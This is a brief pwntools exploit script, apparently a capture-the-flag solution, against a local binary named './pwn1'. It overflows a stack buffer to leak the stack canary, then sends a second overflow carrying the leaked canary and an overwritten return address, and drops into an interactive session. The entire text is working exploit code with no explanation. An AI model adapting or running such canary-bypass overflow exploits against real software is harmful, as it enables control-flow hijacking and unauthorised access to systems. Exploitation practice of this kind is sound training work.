from pwn import *
name = "./pwn1"
p = process(name)
payload1 = b"a"*28 + b"b"*4 
p.sendline(payload1)
p.recvuntil(b"bbbb")
shellcode_addr = 0x804858b 
canary = u32(p.recv(4)) - 0xa
payload2 = b"a"*32 + p32(canary) + b"a"*12 + p32(shellcode_addr)
p.sendline(payload2)
p.interactive()
